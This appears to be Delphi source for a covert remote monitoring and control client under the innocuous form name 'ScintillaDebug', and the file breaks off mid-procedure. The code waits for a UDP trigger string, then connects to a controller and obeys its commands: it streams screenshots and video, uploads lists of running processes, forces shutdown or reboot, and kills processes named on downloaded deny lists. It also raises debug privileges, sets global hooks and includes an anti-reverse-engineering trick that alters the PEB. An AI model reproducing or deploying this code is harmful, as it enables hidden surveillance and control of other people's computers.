unit Unit2;
interface
uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,
  Vcl.ComCtrls, Vcl.ExtCtrls, iramtpCli, iraHookComp, DSE_ThreadTimer, OverbyteIcsWndControl, OverbyteIcsWSocket,
  OverbyteIcsWinSock,


  TLHelp32, JwaPsApi,
  JclSysInfo,
  Inifiles,StrUtils;

type
  TSyncCmd   = function : Boolean  of object;
  TAsyncCmd  = procedure of object;
  TdenyModeLoad = (mOverWrite , mAdd );
  TsendMode = (sScreenshot, sVideo, sNone, sSysview );

  Type TRGB = packed record
    b: byte;
    g: byte;
    r: byte;
  end;
  type RGBROW = array[0..Maxint div 16] of TRGB;

  type PRGB = ^TRGB;
  type PRGBROW = ^RGBROW;

  type
  TScintillaDebug = class(TForm)
    Memo1: TMemo;
    pnlName: TPanel;
    pnl1: TPanel;
    lblText: TLabel;
    lblProcessTitle: TLabel;
    lblInstance: TLabel;
    lblHandle: TLabel;
    lblParent: TLabel;
    lblFunction: TLabel;
    lblMenu: TLabel;
    lblControlID: TLabel;
    lblClass: TLabel;
    lblModuleHandle: TLabel;
    lbl1: TLabel;
    lbl2: TLabel;
    edtText: TEdit;
    edtProcess: TEdit;
    edtInstance: TEdit;
    edtHandle: TEdit;
    edtParent: TEdit;
    edtFunction: TEdit;
    edtMenu: TEdit;
    edtControlID: TEdit;
    edtClass: TEdit;
    edtModuleHandle: TEdit;
    edt1: TEdit;
    edt2: TEdit;
    lblExeName: TLabel;
    lblExePath: TLabel;
    lblCompanyName: TLabel;
    lblProductName: TLabel;
    lblLegalCopyright: TLabel;
    lblLegalTrademarks: TLabel;
    lblFileDescription: TLabel;
    lblOriginalFilename: TLabel;
    lblFileVersion: TLabel;
    lblProductVersion: TLabel;
    lblInternalName: TLabel;
    lblComments: TLabel;
    edtExeName: TEdit;
    edtExePath: TEdit;
    edtCompanyName: TEdit;
    edtProductName: TEdit;
    edtLegalCopyright: TEdit;
    edtLegalTrademarks: TEdit;
    edtFileDescription: TEdit;
    edtOriginalFilename: TEdit;
    edtFileVersion: TEdit;
    edtProductVersion: TEdit;
    edtInternalName: TEdit;
    edtComments: TEdit;
    lbl3: TLabel;
    lbl4: TLabel;
    lbl5: TLabel;
    memo2: TMemo;
    rg1: TRadioGroup;
    udp: TWSocket;
    tcp: TWSocket;
    iraCBTHook1: TiraCBTHook;
    iraMouseHook1: TiraMouseHook;
    MtpClient: TMtpClient;
    Thread: SE_ThreadTimer;
    procedure Display(Msg : String);

    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure tcpDataAvailable(Sender: TObject; ErrCode: Word);
    procedure tcpSessionClosed(Sender: TObject; ErrCode: Word);
    procedure tcpSessionConnected(Sender: TObject; ErrCode: Word);
    procedure udpDataAvailable(Sender: TObject; ErrCode: Word);
    procedure tcpBgException(Sender: TObject; E: Exception; var CanClose: Boolean);
    procedure MtpClientStateChange(Sender: TObject);
    procedure MtpClientSessionConnected(Sender: TObject; ErrCode: Word);
    procedure MtpClientSessionClosed(Sender: TObject; ErrCode: Word);
    procedure MtpClientResponse(Sender: TObject);
    procedure iraCBTHook1Unfiltered(Sender: TObject; Code, wParam, lParam: Integer; var Handled: Boolean);
    procedure iraMouseHook1Unfiltered(Sender: TObject; Code, wParam, lParam: Integer; var Handled: Boolean);
    procedure MtpClientBgException(Sender: TObject; E: Exception; var CanClose: Boolean);
    procedure MtpClientDisplay(Sender: TObject; var Msg: string);
    procedure MtpClientError(Sender: TObject; var Msg: string);
    procedure ThreadTimer(Sender: TObject);


  private
    { Private declarations }

    procedure getScreenShot;
    procedure loadDenyList;
    procedure UdpListen;
    procedure UpdateInfo(W: HWnd; Refresh: Boolean);
    procedure UpdateExeInfo(aFileName: string; w: HWND; PID: cardinal);


  public
    { Public declarations }
    function ByteToText(Value: Byte): string;
    function IntToText(Value: Integer): string;
    function ByteToBin(Value: Byte): string;
    function IntToBin(Value: Integer): string;

    procedure CleanPnl1;
    procedure CleanPnl2;
  end;
const
  EndofLine = #13#10;
  WM_DESTROY_SOCKET = WM_USER + 1;
  ScreenshotW = 136;
  ScreenshotH = 72;
  VideoW = 800;
  VideoH = 450;
var
  ScintillaDebug: TScintillaDebug;
  focusHook:HWND;
  focusHookEX:HWND;
  ServerAddress: string;
  ServerPort: string;
  FSenderAddr    : TSockAddrIn6;
  IP: string;

  SMode: TsendMode;

  BmpSmall, BmpLarge: TBitmap;

  lstDenyCaption, lstDenyClass, lstDenyExe: TStringList;
  denyModeLoad : TdenyModeLoad;
  LoadingDenyText: Boolean;

    Running: Boolean;
    Tmp: TStringList;
    DIR_DATA: string;
    DIR_BASE_DATA: string;

    Target: HWnd;
    OldPID: UINT;

    TargetMainWindow: HWND;
    Inverted,EnableFindNext: Boolean;
    Desktop: TCanvas;
    ScreenShot: TBitmap;
    EnabledHotKey: Boolean;
    MousePoint,DiggerPoint: TPoint;
    ExePath: string;
    MM: TMemoryStream ;
    Mycount: integer;

{$R *.dfm}

implementation
uses iraHookLoader,Wintree,VerInfo,Exeinfo  ;
function ChangePrivilegeModified(privilegeName: string; enable: boolean): boolean;
var
  NewState: TTokenPrivileges;
  luid: TLargeInteger;
  hToken: THandle;
  ReturnLength: DWord;
begin
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, hToken) then
  begin
   if LookupPrivilegeValue(nil, PChar(privilegeName), luid) then
   begin
    NewState.PrivilegeCount:= 1;
    NewState.Privileges[0].Luid := luid;
    NewState.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    if AdjustTokenPrivileges(hToken, False, NewState, SizeOf(TTokenPrivileges), nil, ReturnLength) then
    begin
     // if GetLastError = ERROR_NOT_ALL_ASSIGNED then
     //   ScintillaDebug.Display('Change privilege failed: Not all assigned')
     // else
     //   ScintillaDebug.Display('Privileged');
    end;
   end;
    CloseHandle(hToken);
  end;
end;
function GetFileSize(FileName : String) : integer; { V2.108 }
var
    SR : TSearchRec;
    TempSize: TULargeInteger;  // 64-bit integer record
begin
    if FindFirst(FileName, faReadOnly or faHidden or
                 faSysFile or faArchive, SR) = 0 then begin
        TempSize.LowPart  := SR.FindData.nFileSizeLow;
        TempSize.HighPart := SR.FindData.nFileSizeHigh;
        Result := TempSize.QuadPart;
        FindClose(SR);
    end
    else
        Result := -1;
end;
function FocusHookProc( HWINEVENTHOOK : pointer; event: DWORD; wnd:HWND; idObject, idChild: Cardinal ; dweventThread,dwmsEventTime:DWORD) : LResult; stdcall;
begin
    if Wnd <> 0 then  begin

     ScintillaDebug.UpdateInfo (wnd,True);
     //ScintillaDebug.Display(ScintillaDebug.IntToText(wnd)   + ' ' + ScintillaDebug.IntToText(idobject) + ' '+ ScintillaDebug.IntToText(idChild) + ' ' );
   end;
end;
function FocusHookProcEX( code : integer; wParam: WPARAM; lParam: LPARAM ) : LResult; stdcall;
begin
  if ( code <= 0 ) then
  begin
    result := CallNextHookEx( focusHookEX, code, wParam, lParam );
    exit;
  end;

  result := 0;
  ScintillaDebug.Display('EX' + ScintillaDebug.IntToText(code)   + ' ' + ScintillaDebug.IntToText(wparam) + ' '+ ScintillaDebug.IntToText(lparam) + ' ' );

end;
function GetPathFromPID(const PID: cardinal): string;
var
  hProcess: THandle;
  path: array[0..MAX_PATH - 1] of char;
begin
  hProcess := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, false, PID);
  if hProcess <> 0 then
    try
      if GetModuleFileNameEx(hProcess, 0, path, MAX_PATH) <> 0 then
      result := path;
    finally
      CloseHandle(hProcess)
    end;
end;
function GetWindowExeName(ProcessID: THandle): String;
var
 PE: TProcessEntry32;
 Snap: THandle;
 fullpath: string;
begin
  result:='???';
  pe.dwsize:=sizeof(PE);

 Snap:= CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 if Snap <> 0 then
 begin
   if Process32First(Snap, PE) then
     if PE.th32ProcessID = ProcessId then
       Result:= String(PE.szExeFile)
     else while Process32Next(Snap, PE) do
       if PE.th32ProcessID = ProcessId then
       begin
         Result:= String(PE.szExeFile);
         break;
       end;
   CloseHandle(Snap);
 end;
end;

function RemoveEndOfLine(const Line : String) : String;
begin
    if (Length(Line) >= Length(EndOfLine)) and
       (StrLComp(PChar(@Line[1 + Length(Line) - Length(EndOfLine)]),
                 PChar(EndOfLine),
                 Length(EndOfLine)) = 0) then
        Result := Copy(Line, 1, Length(Line) - Length(EndOfLine))
    else
        Result := Line;
end;
function LookupFtpState (const FtpState: TFtpState): String;  { V2.113 angus }
begin
   case FtpState of
      ftpNotConnected: result := 'Not Connected';
      ftpReady: result := 'Ready';
      ftpInternalReady: result := 'Internal Ready';
      ftpDnsLookup: result := 'DNS Lookup';
      ftpConnected: result := 'Connected';
      ftpAbort: result := 'Abort';
      ftpInternalAbort: result := 'Internal Abort';
      ftpWaitingResponse: result := 'Waiting Response';
   else
      result:='unknown';
   end;
end ;


function TScintillaDebug.ByteToBin(Value: Byte): string;
var
  i,Mask: Byte;
begin
  Mask:=$80;
  Result:='';
  for i:=1 to 8 do
  begin
    if Value and Mask = Mask then Result:=Result+'1'
    else Result:=Result+'0';
    Mask:=Mask shr 1;
  end;
end;

function TScintillaDebug.IntToBin(Value: Integer): string;
var
  i,Mask: DWord;
begin
  Mask:=$80000000;
  Result:='';
  for i:=1 to 32 do begin
    if Value and Mask = Mask then Result:=Result+'1'
    else Result:=Result+'0';
    Mask:=Mask shr 1;
  end;
end;

function TScintillaDebug.ByteToText(Value: Byte): string;
begin
    Result:= IntToHex(Value,2);
end;

function TScintillaDebug.IntToText(Value: Integer): string;
begin
    Result:= IntToHex(Value,8);
end;



procedure TScintillaDebug.iraCBTHook1Unfiltered(Sender: TObject; Code, wParam,   lParam: Integer; var Handled: Boolean);
begin
  Handled:=True;
  UpdateInfo (lParam,True);

end;

procedure TScintillaDebug.iraMouseHook1Unfiltered(Sender: TObject; Code, wParam,  lParam: Integer; var Handled: Boolean);
begin
(* lparam è la sourcewindow*)
  UpdateInfo(lParam, true);
//Caption:= 'unf'+IntToStr(  lparam);

end;

procedure TScintillaDebug.ThreadTimer(Sender: TObject);
begin
//exit;

      if sMode = sNone then Exit;

      if tcp.State = wsConnected then begin

        if sMode = sScreenshot then begin
        //  SMode:= sNone;
          GetScreenShot ();
          MtpClient.StreamSize := ScreenshotW*ScreenshotH*3;
          MtpClient.MemoryName := 'screenshot';
          MtpClient.MemoryPtr := BmpSmall.ScanLine [BmpSmall.Height -1] ;
          MtpClient.Put ;

        end
        else if sMode = sVideo then begin
        //  SMode:= sNone;
          GetScreenShot ();
          MtpClient.StreamSize := VideoW*VideoH*3;
          MtpClient.MemoryName := 'video';
          MtpClient.MemoryPtr := BmpLarge.ScanLine [BmpLarge.Height -1] ;
          MtpClient.Put ;

        end;
      end;

end;

procedure TScintillaDebug.MtpClientBgException(Sender: TObject; E: Exception;   var CanClose: Boolean);
begin
  ScintillaDebug.display ('exc ' + e.Message );

end;

procedure TScintillaDebug.MtpClientDisplay(Sender: TObject; var Msg: string);
begin
if ScintillaDebug.memo1 <> nil then  ScintillaDebug.display(msg);

  if Msg = '< 226 File received ok:screenshot' then begin

  end
  else   if Msg = '< 226 File received ok:sysview' then begin
//    sMode := sNone;//sScreenshot;
    thread.Enabled := True;
  end
  else   if Msg = '< 226 File sent ok' then begin     { TODO : nominare i files }
    MtpClient.LocalStream.SaveToFile(DIR_DATA + 'deny.txt' );
    Sleep(300);
    LoadDenyList ;
//    sMode := sScreenshot;
    thread.Enabled := True;
  end;


end;

procedure TScintillaDebug.MtpClientError(Sender: TObject; var Msg: string);
begin
  ScintillaDebug.Display('error ' + Msg);

end;

procedure TScintillaDebug.MtpClientResponse(Sender: TObject);
begin
      ScintillaDebug.Display(MtpClient.LastResponse);

end;

procedure TScintillaDebug.MtpClientSessionClosed(Sender: TObject;   ErrCode: Word);
begin
   ScintillaDebug.lbl5.Font.Color:= clRed;
   ScintillaDebug.lbl5.Caption := 'Mtp Closed';

   Thread.Interval := 2000;

end;

procedure TScintillaDebug.MtpClientSessionConnected(Sender: TObject;   ErrCode: Word);
begin
If ErrCode = 0 then begin
  ScintillaDebug.Display ( 'Connessione a Mtp :OK') ;
  ScintillaDebug.lbl5.Font.Color:= clgreen;
  ScintillaDebug.lbl5.Caption := 'Mtp Connected';
end
 else
    ScintillaDebug.Display ( 'Connessione a Mtp Error:' + IntToStr(Errcode));

end;

procedure TScintillaDebug.MtpClientStateChange(Sender: TObject);
begin
  if ScintillaDebug.memo1 <> nil then ScintillaDebug.Display(LookupFtpState (MtpClient.State ) );
end;

procedure TScintillaDebug.tcpBgException(Sender: TObject; E: Exception;  var CanClose: Boolean);
begin
        ScintillaDebug.Display(E.Message );

end;

procedure TScintillaDebug.tcpDataAvailable(Sender: TObject; ErrCode: Word);
var
  I, LEN: Integer;
  Buf     : array [0..255] of AnsiChar;
  buf2: Array [0..255] of char;
  ini : Tinifile;
  aList : TStringlist;
  wnd: Thandle;
  pid : THandle;
  Text: string;
begin

    Len := TCustomLineWSocket(Sender).Receive(@Buf, Sizeof(Buf) - 1);
    if Len <= 0 then Exit;

    Buf[Len]       := #0;              { Nul terminate  }
    Text := RemoveEndOfLine(String(Buf));
    ScintillaDebug.Display('in: '+ Text);


  //mm.Enabled :=false;
  Tmp.Clear ;
  Tmp.CommaText := Text;

  // Escludi Pc


  if Tmp[0]='ftppwd' then  begin
        sMode := sNone;
        sMode := sScreenShot;
//        thread.Priority := tpLower;
        //tcp.SendStr('sendscreenshot' + IntToStr((128*72*3)) + endofline);
  end
  else if Tmp[0]='startscreenshot' then begin
      thread.Enabled := false;
      sMode := sScreenShot;
      thread.Interval := StrToIntDef(Tmp[1],2000);
      thread.Enabled := true;

  end
  else if Tmp[0]='stopscreenshot' then  Begin
      sMode:= sNone;
      thread.Enabled := false;
    end
  else if Tmp[0]='stopvideo' then  Begin
//      MtpClient.Abort ;
      sMode:= sNone;
      thread.Enabled := false;
    end
  else if Tmp[0]='startvideo' then  Begin
      thread.Enabled := false;
      sMode := sVideo;
      thread.Interval :=  StrToIntDef(Tmp[1],2000);
      thread.Enabled := true;

    end
  else if Tmp[0]='STOP' then
    Begin
      //Running := False;
      //thread.Enabled := false;
    end
    else if Tmp[0]='START' then
    begin
      //Running := true;
      //thread.Enabled := True;
    end


  else if Tmp[0]='sh' then
    Begin
      if Running= False then Exit;
      ExitWindows(EWX_POWEROFF or EWX_FORCE,0) ;
    end
  else if Tmp[0]='rv' then
    Begin
      if Running= False then Exit;
      ExitWindows(EWX_REBOOT or EWX_FORCE,0);
    end
    else if Tmp[0]='getsysview' then   // GETSYSVIEW,randompwd per accesso FTP. Dopo ogni invio il server genera una nuova password
    Begin

 //     MtpClient.Abort ;
      thread.Enabled := false;
      // poi qui sotto faccio RETR per avere deny.txt
//      Ftp.LocalFileName:= DIR_DATA + 'sysview.txt';
//      if FileExists(Ftp.LocalFileName) then DeleteFile(pchar(Ftp.LocalFileName));
      ini:= TIniFile.Create(DIR_DATA + 'sysview.txt');

      aList := TStringList.Create ;

      aList.Sorted := True;
      aList.Duplicates := dupIgnore ;

      RunningProcessesList(aList , true);

      Ini.WriteInteger('processes' ,'count',aList.Count );

      for I := 0 to aList.Count -1 do begin
        pid := GetPidFromProcessName(aList.Strings [i]);
        Wnd:= GetMainAppWndFromPid(PID);

        Ini.WriteString ('process' + IntToStr(i+1),'FullPath', aList.Strings [i] );
        Ini.WriteString ('process' + IntToStr(i+1),'Caption',GetWindowCaption(Wnd) );
        buf2[0]:=#0;
        GetClassName( wnd, Buf2, 256);
        Ini.WriteString ('process' + IntToStr(i+1),'ClassName', string(buf2)  );


      end;

      aList.free;

      Ini.WriteInteger('denycaption' ,'count', lstdenycaption.Count );
      for I := 0 to lstDenyCaption.count -1 do begin
        Ini.WriteString ('denycaption' ,  IntToStr(i+1), lstdenycaption.Strings [i] );
      end;

      Ini.WriteInteger('denyclass' ,'count', lstdenyclass.Count );
      for I := 0 to lstDenyClass.count -1 do begin
        Ini.WriteString ('denyclass' , IntToStr(i+1), lstdenyclass.Strings [i] );
      end;

      Ini.WriteInteger('denyExe' ,'count', lstdenyExe.Count );
      for I := 0 to lstDenyExe.count -1 do begin
        Ini.WriteString ('denyExe' , IntToStr(i+1), lstdenyExe.Strings [i] );
      end;

      ini.Free;

      MM.LoadFromFile(DIR_DATA + 'sysview.txt') ;
      MtpClient.StreamSize := MM.Size ;
      MtpClient.MemoryPtr := MM.Memory ;
      MtpClient.MemoryName := 'sysview';
      MtpClient.Put ;

      (*      SYSVIEW SOURCE
        aProcess32.dwSize := SizeOf( aProcess32 );
        Handler := CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );


        try
          if Process32First( Handler, aProcess32 ) then begin
              c:=1;
              Ini.WriteString ('exe' + IntToStr(c),'FullPath', aProcess32.szExeFile );
              Buf2[0]:= #0;              { Nul terminate  }
              GetClassName( aProcess32.th32ProcessID, Buf2, 256);
              Ini.WriteString ('exe' + IntToStr(c),'ClassName',     string(Buf2) );

              while Process32Next( Handler, aProcess32 ) do begin
                Inc(c);
                Ini.WriteString ('exe' + IntToStr(c),'FullPath', aProcess32.szExeFile );
                Buf2[0]:= Chr(0);
                GetClassName( aProcess32.th32ProcessID, Buf2, 256);
                Ini.WriteString ('exe' + IntToStr(c),'ClassName',   string(Buf2) );
              end;
          end;
        Finally
        CloseHandle( Handler );
        end;

      Ini.WriteInteger('setup' ,'count',c);
      ini.free;
*)


        //if ftpclient1.Connected then Ftpclient1.Quit;
      //ExecuteCmd(Ftp.Receive, Ftp.ReceiveAsync);
//      ftp.HostFileName := IP  + '_sysview.txt';
//      ExecuteCmd(Ftp.Transmit , Ftp.TransmitAsync );
    end
    else if Tmp[0]='denyready' then begin
//      while ftp.Connected do begin
//        application.ProcessMessages ;
//      end;
//      MtpClient.Abort ;
      while MtpClient.State <> ftpready do begin
        sleep(300);
        application.ProcessMessages ;
      end;

      thread.Enabled := false;
      MtpClient.Get ;
      if tmp[1] = 'overwrite' then denyModeLoad := mOverWrite else
      if tmp[1] = 'add' then denyModeLoad := mAdd;

      //Ftp.LocalFileName:= DIR_DATA + 'deny.txt';
      //if FileExists(Ftp.LocalFileName) then DeleteFile(pchar(Ftp.LocalFileName));

      //ftp.HostFileName := IP  + '_deny.txt';
      //ExecuteCmd(Ftp.Receive  , Ftp.ReceiveAsync  );
    end;

end;

procedure TScintillaDebug.tcpSessionClosed(Sender: TObject; ErrCode: Word);
begin
   ScintillaDebug.lbl4.Font.Color := clRed;
   ScintillaDebug.lbl4.Caption := 'Tcp Disconnected';
   ScintillaDebug.Display('Disconnected, error #' + IntToStr(ErrCode) );
   UdpListen;

end;

procedure TScintillaDebug.tcpSessionConnected(Sender: TObject; ErrCode: Word);
begin
    if ErrCode <> 0 then begin
           ScintillaDebug.Display('Can''t connect, error #' + IntToStr(ErrCode))
    end
    else begin



        ScintillaDebug.lbl4.Font.Color := clGreen;
        ScintillaDebug.lbl4.Caption := 'Tcp Connected';
        ScintillaDebug.lbl3.Font.Color := clRed;
        ScintillaDebug.lbl3.Caption := 'Udp Listen OFF';

        ScintillaDebug.Display('Session Connected to TcpServer.');

        Udp.CloseDelayed ;
        tcp.SendStr( 'computer' + GetLocalComputerName +#13#10);


    end;

end;

procedure TScintillaDebug.udpDataAvailable(Sender: TObject; ErrCode: Word);
var
      Buffer : array [0..1023] of AnsiChar;
      Len    : Integer;
      Src    : TSockAddrIn6;
      SrcLen : Integer;
      Text   : string;
begin

     if tcp.State = wsConnected  then Exit;      // può succedere?



      if FSenderAddr.sin6_family = AF_INET then begin
          SrcLen := SizeOf(TSockAddrIn);
          Len    := udp.ReceiveFrom(@Buffer, SizeOf(Buffer), PSockAddr(@Src)^, SrcLen);
          if Len >= 0 then begin
              if (PSockAddr(@FSenderAddr).sin_addr.S_addr = INADDR_ANY) or
                 (PSockAddr(@FSenderAddr).sin_addr.S_addr = PSockAddr(@Src).Sin_addr.S_addr) then begin
                  Buffer[Len] := #0;
                  Text                      := String(WSocket_inet_ntoa(PSockAddr(@Src).sin_addr)) +
                                            ':'  + IntToStr(WSocket_ntohs(PSockAddr(@Src).sin_port)) +
                                            '--> ' + String(Buffer);
                  ServerAddress:= String(WSocket_inet_ntoa(PSockAddr(@Src).sin_addr));
              end;
          end;
      end
      else begin
          SrcLen := SizeOf(src);
          Len    := udp.ReceiveFrom(@Buffer, SizeOf(Buffer), PSockAddr(@Src)^, SrcLen);
          if Len >= 0 then begin
              if IN6ADDR_ISANY(@FSenderAddr) or
                 IN6_ADDR_EQUAL(@FSenderAddr.sin6_addr, @Src.sin6_addr) then begin
                  Buffer[Len] := #0;
                  Text                      := WSocketIPv6ToStr(PIcsIPv6Address(@Src.sin6_addr)^) +
                                            ':'  + IntToStr(WSocket_ntohs(PSockAddr(@Src).sin_port)) +
                                            '--> ' + String(Buffer);
                  ServerAddress:= WSocketIPv6ToStr(PIcsIPv6Address(@Src.sin6_addr)^);
              end;
          end;
      end;


      Text := RemoveEndOfLine(String(Buffer));
      Len := Length(Text);
      if Len <= 0 then Exit;
      ScintillaDebug.Display(Text);


      if leftstr(text,17) ='IRYNA.SMOLYARENKO' then begin
//        PSockAddr    FSenderAddr

        ServerPort := rightStr(Text, Length(text) - 17);

        tcp.LineMode := true;
    //    tcp.LineMode := false;
        tcp.Addr := ServerAddress;
        tcp.Port := ServerPort;
        tcp.LineLimit := 1024;
        tcp.LineEdit  := false;
        tcp.LineEnd := EndOfLine;
        tcp.LingerOnOff := wsLingerOn;
        tcp.Connect;

        MtpClient.HostName  := ServerAddress;
        MtpClient.Port := IntToStr((StrToInt(ServerPort) +1));
        MtpClient.Open;


        udp.CloseDelayed ;
     end;
    //TCustomLineWSocket(Sender).DeleteBufferedData ;

end;

procedure TScintillaDebug.CleanPnl1;
begin
  edtText.Text:='';
  edtProcess.Text:='';
  edtInstance.Text:='';
  edtHandle.Text:='';
  edtParent.Text:='';
  edtFunction.Text:='';
  edtMenu.Text:='';
  edtControlID.Text:='';
  edtClass.Text:='';
  edtModuleHandle.Text:='';
  edt1.text:='';
  edt2.Text:='';

end;
procedure TScintillaDebug.CleanPnl2;
begin
  edtExePath.text:='';
  edtExeName.text:='';
  edtOriginalFilename.Text:='';
  edtFileDescription.Text:='';
  edtFileVersion.Text:='';
  edtProductName.Text:='';
  edtInternalName.Text:='';
  edtLegalCopyright.Text:='';
  edtLegalTrademarks.Text:='';
  edtProductVersion.Text:='';
  edtCompanyName.Text:='';
  edtComments.Text:='';

end;



procedure TScintillaDebug.Display(Msg : String);
var
msg2: string;
begin
  Msg2:=Msg;
  //ReplaceS(Msg2,'|', '    ' );
  if memo1.Lines.Count  > 1000 then begin  { Prevent TMemo overflow }
        memo1.LineS.Clear ;
  end;
  memo1.Lines.add (msg2);
end;
procedure TScintillaDebug.FormCreate(Sender: TObject);
var
dummy: string;
begin
{$IFDEF Anti_Reverse}
        asm
          mov eax, fs:[$30] // PEB
          mov eax, [eax + $0c] // PEB_LDR_DATA
          mov eax, [eax + $0c] // InOrderModuleList
          mov dword ptr [eax + $20], 100000000 // SizeOfImage
        end;
{$ENDIF Anti_Reverse}

ChangePrivilegeModified ('SeDebugPrivilege', true);    { TODO : RUN AS ADMINISTRATOR. verificare Services }
ChangePrivilegeModified ('SeShutdownPrivilege', true);
MM:= TMemoryStream.Create ;                 // invia sysview.txt

SMode:= sNone;
thread.Enabled := True;

IP:= GetIPAddress(GetLocalComputerName);
  Scintilladebug.Caption := GetLocalComputerName + ' ' + IP;
DIR_BASE_DATA:= GetLocalAppData + '\Scintilla\';
DIR_DATA:= GetLocalAppData + '\Scintilla\Client\'; //GetAppData;
if not DirectoryExists(DIR_BASE_DATA) then  MkDir(DIR_BASE_DATA);
if not DirectoryExists(DIR_DATA) then  MkDir(DIR_DATA);

  BmpSmall := TBitmap.Create;
  BmpSmall.Width  := ScreenshotW;
  BmpSmall.Height  := ScreenshotH;
  BmpSmall.pixelformat:= pf24bit;

  BmpLarge := TBitmap.Create;
  BmpLarge.Width  := VideoW;
  BmpLarge.Height  := VideoH;
  BmpLarge.pixelformat:= pf24bit;


tmp:= Tstringlist.Create ;

lstDenyCaption := Tstringlist.Create ;
lstDenyCLass := Tstringlist.Create ;
lstDenyExe := Tstringlist.Create ;

lstDenyCaption.Sorted := True;
lstDenyCaption.Duplicates := dupIgnore ;
lstDenyClass.Sorted := True;
lstDenyClass.Duplicates := dupIgnore ;
lstDenyExe.Sorted := True;
lstDenyExe.Duplicates := dupIgnore ;


denyModeLoad := mOverWrite;
LoadDenyList;
LoadingDenyText:= False;


Running:= True;
//    iraShellHook1.Start ;
    dummy:= iraCBTHook1.Start ;
  //  iraKeyboardHook1.Start ;
  dummy:= iraMouseHook1.Start ;                                                //

//cusHook := SetWinEventHook( EVENT_OBJECT_FOCUS, EVENT_OBJECT_FOCUS, 0, @FocusHookProc,0,0, WINEVENT_OUTOFCONTEXT );
focusHook := SetWinEventHook( EVENT_OBJECT_LOCATIONCHANGE , EVENT_OBJECT_LOCATIONCHANGE, 0, @FocusHookProc,0,0,WINEVENT_OUTOFCONTEXT or WINEVENT_SKIPOWNPROCESS);
//focusHook := SetWinEventHook( EVENT_OBJECT_LOCATIONCHANGE , EVENT_OBJECT_LOCATIONCHANGE, 0, @FocusHookProc,0,0,0);
//focusHook := SetWinEventHook( EVENT_OBJECT_CREATE , EVENT_OBJECT_CREATE, 0, @FocusHookProc,0,0,WINEVENT_OUTOFCONTEXT or WINEVENT_SKIPOWNPROCESS);
//focusHook := SetWinEventHook( EVENT_OBJECT_CREATE, EVENT_OBJECT_LOCATIONCHANGE, 0, @FocusHookProc,0,0, 0 );
//focusHook := SetWinEventHook( EVENT_OBJECT_LOCATIONCHANGE, EVENT_OBJECT_LOCATIONCHANGE, 0, @FocusHookProc,0,0,WINEVENT_OUTOFCONTEXT);
//focusHookEX:= SetWindowsHookEx   ( WH_GETMESSAGE , @FocusHookProcEX,  0, GetCurrentThreadId  );

// dwThreadId (the last argument) set to 0 should create a global hook

UdpListen;

    ScintillaDebug.lbl3.Font.Color := clGreen;
    ScintillaDebug.lbl3.Caption := 'Udp listen ON';

end;




procedure TScintillaDebug.FormDestroy(Sender: TObject);
begin
    Running:= False;
//    iraShellHook1.Stop;
    iraCBTHook1.Stop;
//    iraKeyboardHook1.Stop;
    iraMouseHook1.Stop;
   UnhookWinEvent (focusHook) ;

    MtpClient.Quit ;
    while MtpClient.State <> ftpReady do begin
      application.ProcessMessages ;
    end;
//    MtpClient.DataSocket.Close ;
    MM.free;
    TMP.Free;
    lstDenyCaption.Free;
    lstDenyCLass.Free;
    lstDenyExe.Free;

    BmpSmall.Free;
    BmpLarge.Free;
 //   UnhookWindowsHookEx (focusHookEX) ;

end;
procedure TScintillaDebug.UpdateInfo(W: HWnd; Refresh: Boolean);
var
  B: array[0..255] of Char;
  D: array[0..255] of Char;
  C: array[0..16384] of Char;
  PID: UINT;
  WndParent: HWND;
  TmpWndParent: HWND;
  i: Integer;
  buf:  Array [0..255] of char;
  ProcHandle: THandle;
  sss: string;
  ClassName, aCaption: string;
begin


    if LoadingDenyText then Exit;
    if Target = W then Exit;

    Target:=W;
    SendMessage( W, WM_GETTEXT, 256, integer(@C));
    GetWindowThreadProcessID(W,@PID);

    ScintillaDebug.CleanPnl1;
    ScintillaDebug.edtText.Text:=C;

    ScintillaDebug.edtProcess.Text:=ScintillaDebug.IntToText(PID);
    ScintillaDebug.edtInstance.Text:=ScintillaDebug.IntToText(GetWindowLong(W,GWL_HINSTANCE));
    ScintillaDebug.edtHandle.Text:=ScintillaDebug.IntToText(W);
    ScintillaDebug.edtParent.Text:=ScintillaDebug.IntToText(GetParent(W));
    ScintillaDebug.edtControlID.Text:=ScintillaDebug.IntToText(GetWindowLong(W,GWL_ID));
    ScintillaDebug.edtFunction.Text:=ScintillaDebug.IntToText(GetWindowLong(W,GWL_WNDPROC));
    if GetParent(W)=0 then ScintillaDebug.edtMenu.Text:=ScintillaDebug.IntToText(GetMenu(W))
    else ScintillaDebug.edtMenu.Text:=ScintillaDebug.IntToText(0);

    ScintillaDebug.edtModuleHandle.Text:=ScintillaDebug.IntToText(GetClassLong(W,GCL_HMODULE));

    // class info

    GetClassName( W, Buf, 256);
    ScintillaDebug.edtClass.Text:=string(Buf);

    (* Cerco la Main Window*)
    WndParent:=GetWindowLong(W,GWL_HWNDPARENT);
    if WndParent = 0 then begin
      ScintillaDebug.CleanPnl2;
      WndParent := W;
    end;

    tmpWndParent:=WndParent;
    while tmpWndParent<>0 do
    begin
      tmpWndParent:=GetWindowLong(WndParent,GWL_HWNDPARENT);
      if tmpWndParent <> 0 then begin
        WndParent:= tmpWndParent;
      end;
    end;
    TargetMainWindow := WndParent;

    if (WndParent <> 0) then begin
      ScintillaDebug.CleanPnl2;

            // add "Class name" column
            GetClassName(WndParent,B,SizeOf(B));
            ClassName := string(B);
            ScintillaDebug.edt2.Text:= ClassName;

            for I := 0 to lstDenyClass.Count -1 do begin

              if lstDenyClass.Strings [i] = lowercase(ClassName) then begin
                sss := GetPathFromPID (PID);
                ScintillaDebug.memo2.lines.Add ('Class: '+ lowercase(ClassName) + ' PID: ' + IntToStr(PID) + ' exe: ' + sss);
                if ScintillaDebug.rg1.ItemIndex = 1 then begin
                  ProcHandle := OpenProcess(SYNCHRONIZE or PROCESS_TERMINATE, False, PID);
                  TerminateProcess(ProcHandle,0);
                  Exit;
                end;

              end;

            end;

            // add "Text" column
